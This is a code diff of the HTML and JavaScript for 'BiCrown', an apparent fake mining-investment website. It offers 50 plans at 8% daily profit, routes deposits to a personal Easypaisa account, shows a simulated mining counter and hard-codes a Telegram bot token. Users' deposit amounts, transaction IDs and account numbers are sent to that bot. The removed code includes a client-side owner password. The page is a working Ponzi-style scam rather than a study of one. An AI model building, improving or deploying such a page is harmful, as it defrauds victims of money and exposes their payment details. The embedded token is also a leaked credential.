@@ -3,149 +3,160 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BiCrown | Elite Mining Network</title>
+    <title>BiCrown | The Mining King</title>
     <style>
-        :root { --neon-purple: #bc13fe; --dark-bg: #050505; --card-bg: #121212; --text-gray: #777; --success: #00ff88; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--dark-bg); color: white; margin: 0; display: flex; overflow-x: hidden; }
+        :root { --neon-purple: #bc13fe; --dark-bg: #050505; --card-bg: #121212; --text-gray: #aaa; --success: #00ff88; --gold: #ffd700; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--dark-bg); color: white; margin: 0; display: flex; }
         
-        /* Sidebar Styles */
-        .sidebar { width: 260px; background: #000; height: 100vh; border-right: 1px solid #1a1a1a; position: fixed; padding: 20px; z-index: 100; }
-        .sidebar h1 { color: var(--neon-purple); text-shadow: 0 0 15px var(--neon-purple); letter-spacing: 2px; }
-        .nav-item { padding: 14px; color: var(--text-gray); cursor: pointer; border-radius: 10px; margin-bottom: 8px; transition: 0.3s; display: flex; align-items: center; }
-        .nav-item:hover { background: #1a1a1a; color: white; transform: translateX(5px); }
+        /* Sidebar */
+        .sidebar { width: 250px; background: #000; height: 100vh; border-right: 1px solid #222; position: fixed; padding: 20px; }
+        .sidebar h1 { color: var(--neon-purple); text-shadow: 0 0 10px var(--neon-purple); margin-bottom: 40px; }
+        .nav-item { padding: 15px; color: var(--text-gray); cursor: pointer; border-radius: 12px; margin-bottom: 10px; transition: 0.3s; }
+        .nav-item:hover, .nav-item.active { background: #1a1a1a; color: white; border-left: 4px solid var(--neon-purple); }
 
-        /* Main Content */
-        .main { margin-left: 300px; padding: 30px; width: calc(100% - 300px); transition: 0.3s; }
-        .card { background: var(--card-bg); padding: 25px; border-radius: 18px; border: 1px solid #222; margin-bottom: 25px; }
+        /* Main Area */
+        .main { margin-left: 280px; padding: 30px; width: 100%; }
+        .card { background: var(--card-bg); padding: 25px; border-radius: 20px; border: 1px solid #222; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         
-        /* Plans Grid */
+        /* Mining Grid */
         .plan-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
-        .plan-card { background: #181818; padding: 20px; border-radius: 20px; border: 1px solid #333; text-align: center; transition: 0.4s; position: relative; overflow: hidden; }
-        .plan-card:hover { border-color: var(--neon-purple); transform: translateY(-5px); box-shadow: 0 5px 15px rgba(188, 19, 254, 0.2); }
-        .plan-badge { background: var(--neon-purple); font-size: 10px; padding: 3px 10px; border-radius: 10px; position: absolute; top: 10px; right: 10px; }
+        .plan-card { background: #181818; padding: 25px; border-radius: 20px; border: 1px solid #333; text-align: center; position: relative; transition: 0.3s; }
+        .plan-card:hover { border-color: var(--neon-purple); transform: translateY(-5px); }
+        .plan-price { font-size: 28px; font-weight: bold; margin: 15px 0; color: #fff; }
         
-        .plan-price { font-size: 24px; font-weight: bold; color: white; margin: 10px 0; }
-        .profit-text { color: var(--success); font-size: 14px; font-weight: 500; }
-        
-        .action-btn { background: linear-gradient(45deg, var(--neon-purple), #5a12fa); border: none; color: white; padding: 12px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; margin-top: 15px; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: white; }
+        /* Inputs & Buttons */
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #000; color: white; box-sizing: border-box; }
+        .btn { background: linear-gradient(45deg, var(--neon-purple), #6a11cb); color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
+        .btn:hover { opacity: 0.8; box-shadow: 0 0 20px rgba(188, 19, 254, 0.4); }
+        .btn-withdraw { background: #222; border: 1px solid var(--success); color: var(--success); }
 
-        @media (max-width: 768px) {
-            .sidebar { width: 60px; padding: 10px; overflow: hidden; }
-            .sidebar h1 { display: none; }
-            .main { margin-left: 80px; width: calc(100% - 100px); }
-        }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-content { background: var(--card-bg); padding: 30px; border-radius: 25px; width: 90%; max-width: 400px; border: 1px solid var(--neon-purple); }
     </style>
 </head>
 <body>
 
     <div class="sidebar">
         <h1>BiCrown</h1>
-        <div class="nav-item" onclick="showPage('dash')">🏠 Dashboard</div>
+        <div class="nav-item active" onclick="showPage('dash')">🏠 Dashboard</div>
         <div class="nav-item" onclick="showPage('plans')">💎 Mining Plans</div>
+        <div class="nav-item" onclick="showPage('wallet')">💰 Wallet (Dep/With)</div>
         <div class="nav-item" onclick="showPage('ref')">👥 Refer & Earn</div>
-        <div class="nav-item" onclick="showPage('dep')">💸 Withdraw</div>
-        <div class="nav-item" onclick="openAdmin()" style="margin-top:20px; border-top:1px solid #222; padding-top:20px;">🔐 Owner Access</div>
     </div>
 
     <div class="main">
         <div id="dash-page">
-            <div class="card" style="display: flex; justify-content: space-between; align-items: center;">
-                <div>
-                    <p style="color:var(--text-gray); margin:0;">Total Balance</p>
-                    <h1 style="font-size: 45px; margin: 5px 0;">Rs 0.00</h1>
-                </div>
-                <div style="text-align: right;">
-                    <p style="color:var(--success); margin:0;">● Live Mining</p>
-                    <h2 id="mining-live">$0.00000</h2>
-                </div>
+            <div class="card">
+                <p style="color:var(--text-gray)">Available Balance</p>
+                <h1 style="font-size: 50px; margin: 10px 0;">Rs <span id="user-bal">0.00</span></h1>
+                <p style="color:var(--success)">● Mining Status: <span id="mining-status">Inactive</span></p>
             </div>
             <div class="plan-grid">
-                <div class="card" style="margin:0;"><h4>Team Members</h4><h2 style="color:var(--neon-purple);">12</h2></div>
-                <div class="card" style="margin:0;"><h4>Total Profit</h4><h2 style="color:var(--success);">Rs 600</h2></div>
+                <div class="card"><h4>Total Withdraw</h4><h2 style="color:var(--gold)">Rs 0</h2></div>
+                <div class="card"><h4>Team Profit</h4><h2 style="color:var(--neon-purple)">Rs 0</h2></div>
             </div>
         </div>
 
         <div id="plans-page" style="display:none;">
-            <h2 style="margin-bottom:20px;">Mining Packages (50+ Available)</h2>
-            <div class="plan-grid" id="plan-container">
-                </div>
+            <h2 style="margin-bottom:20px;">Choose Your Miner</h2>
+            <div class="plan-grid" id="plan-container"></div>
         </div>
 
-        <div id="dep-page" style="display:none;" class="card">
-            <h2>Withdraw Funds</h2>
-            <input type="text" id="acc-num" placeholder="JazzCash/Easypaisa Number">
-            <input type="number" id="withdraw-amount" placeholder="Amount in Rs">
-            <button class="action-btn" id="send-btn">Submit Request</button>
+        <div id="wallet-page" style="display:none;">
+            <div class="card">
+                <h2>Deposit Funds</h2>
+                <p style="color:var(--text-gray)">Send payment to the details below:</p>
+                <div style="background:#000; padding:15px; border-radius:10px; margin:15px 0; border:1px dashed var(--neon-purple)">
+                    <p><strong>Easypaisa:</strong> 03xx-xxxxxxx</p>
+                    <p><strong>Name:</strong> Romi Shah</p>
+                </div>
+                <input type="number" id="dep-amount" placeholder="Amount Sent (Rs)">
+                <input type="text" id="trx-id" placeholder="Transaction ID (TRX ID)">
+                <button class="btn" onclick="sendToTelegram('Deposit')">Submit Deposit</button>
+            </div>
+
+            <div class="card">
+                <h2>Withdraw Funds</h2>
+                <input type="number" id="with-amount" placeholder="Amount to Withdraw">
+                <select id="method">
+                    <option>JazzCash</option>
+                    <option>Easypaisa</option>
+                </select>
+                <input type="text" id="wallet-num" placeholder="Account Number">
+                <button class="btn btn-withdraw" onclick="sendToTelegram('Withdraw')">Request Withdrawal</button>
+            </div>
         </div>
 
         <div id="ref-page" style="display:none;" class="card">
-            <h2>Referral System</h2>
-            <p>Invite friends and get Rs 50 bonus.</p>
-            <code style="background:#000; padding:10px; display:block; color:var(--success);">https://bicrown-mining.netlify.app/?ref=romi742</code>
+            <h2>Your Referral Link</h2>
+            <div style="background:#000; padding:20px; border-radius:10px; color:var(--success); word-break: break-all;">
+                https://bicrown-mining.netlify.app/?ref=user742
+            </div>
+            <p style="margin-top:20px;">Invite friends to get 10% of their deposit instantly!</p>
         </div>
+    </div>
 
-        <div id="admin-panel" style="display:none;" class="card">
-            <h2 style="color:red">OWNER Panel</h2>
-            <div id="admin-logs">> All systems green. Bot active.</div>
+    <div class="modal" id="payModal">
+        <div class="modal-content">
+            <h3 id="modal-title">Activate Miner</h3>
+            <p id="modal-desc"></p>
+            <button class="btn" onclick="showPage('wallet'); closeModal();">Go to Deposit Page</button>
+            <button class="btn" style="background:#333; margin-top:10px;" onclick="closeModal()">Cancel</button>
         </div>
     </div>
 
     <script>
-        // Pages switch logic
-        function showPage(p) {
-            ['dash-page', 'plans-page', 'ref-page', 'dep-page', 'admin-panel'].forEach(id => {
-                document.getElementById(id).style.display = 'none';
-            });
-            document.getElementById(p + '-page') ? document.getElementById(p + '-page').style.display = 'block' : null;
-            if(p === 'dep') document.getElementById('dep-page').style.display = 'block';
-        }
-
-        // --- 50+ PLANS GENERATOR ---
-        const container = document.getElementById('plan-container');
-        let startPrice = 350;
-        
-        for (let i = 1; i <= 52; i++) {
-            let daily = Math.floor(startPrice * 0.08); // 8% Daily Profit
-            let total = daily * 30; // 30 Days Cycle
-            
-            const planHTML = `
-                <div class="plan-card">
-                    <div class="plan-badge">LEVEL ${i}</div>
-                    <span style="color:var(--text-gray)">MINER v${i}.0</span>
-                    <div class="plan-price">Rs ${startPrice.toLocaleString()}</div>
-                    <p class="profit-text">Daily: Rs ${daily}</p>
-                    <p style="font-size:12px; color:var(--text-gray)">Monthly: Rs ${total}</p>
-                    <button class="action-btn" onclick="alert('Please contact admin to deposit Rs ${startPrice}')">Activate Miner</button>
-                </div>
-            `;
-            container.innerHTML += planHTML;
-            startPrice += 500; // Har plan 500 mehnga
-        }
-
-        // Live Mining Effect
-        let liveAmt = 0;
-        setInterval(() => {
-            liveAmt += 0.000021;
-            document.getElementById('mining-live').innerText = "$" + liveAmt.toFixed(5);
-        }, 1500);
-
-        // Telegram Logic
         const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
         const chatId = "7005219148";
 
-        document.getElementById('send-btn').addEventListener('click', function() {
-            const acc = document.getElementById('acc-num').value;
-            const amt = document.getElementById('withdraw-amount').value;
-            if(acc && amt) {
-                const msg = `👑 *BiCrown Request*%0A💰 Amount: Rs ${amt}%0A💳 Account: ${acc}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=Markdown`)
-                .then(() => { alert("Sent!"); });
-            }
-        });
+        function showPage(p) {
+            ['dash-page', 'plans-page', 'wallet-page', 'ref-page'].forEach(id => {
+                document.getElementById(id).style.display = 'none';
+            });
+            document.getElementById(p + '-page').style.display = 'block';
+            
+            document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+        }
 
-        function openAdmin() {
-            if(prompt("Key:") === "romi742327") document.getElementById('admin-panel').style.display = 'block';
+        // Generate 50+ Plans
+        const container = document.getElementById('plan-container');
+        let price = 350;
+        for (let i = 1; i <= 50; i++) {
+            container.innerHTML += `
+                <div class="plan-card">
+                    <div style="color:var(--neon-purple); font-weight:bold;">LEVEL ${i}</div>
+                    <div class="plan-price">Rs ${price.toLocaleString()}</div>
+                    <p style="color:var(--success)">Daily Rs ${Math.floor(price*0.08)}</p>
+                    <button class="btn" onclick="openModal(${price}, ${i})">Activate Now</button>
+                </div>
+            `;
+            price += 500;
+        }
+
+        function openModal(amt, lvl) {
+            document.getElementById('modal-title').innerText = `Level ${lvl} Miner`;
+            document.getElementById('modal-desc').innerText = `To activate this miner, you need a balance of Rs ${amt}. Please deposit first.`;
+            document.getElementById('payModal').style.display = 'flex';
+        }
+
+        function closeModal() { document.getElementById('payModal').style.display = 'none'; }
+
+        function sendToTelegram(type) {
+            let msg = "";
+            if(type === 'Deposit') {
+                const amt = document.getElementById('dep-amount').value;
+                const trx = document.getElementById('trx-id').value;
+                msg = `📥 *NEW DEPOSIT*%0A💰 Amount: Rs ${amt}%0A🆔 TRX ID: ${trx}`;
+            } else {
+                const amt = document.getElementById('with-amount').value;
+                const num = document.getElementById('wallet-num').value;
+                const meth = document.getElementById('method').value;
+                msg = `📤 *WITHDRAW REQUEST*%0A💰 Amount: Rs ${amt}%0A💳 Method: ${meth}%0A🔢 Number: ${num}`;
+            }
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=Markdown`)
+            .then(() => alert("Request sent to Admin! Waiting for approval."));
         }
     </script>
 </body>
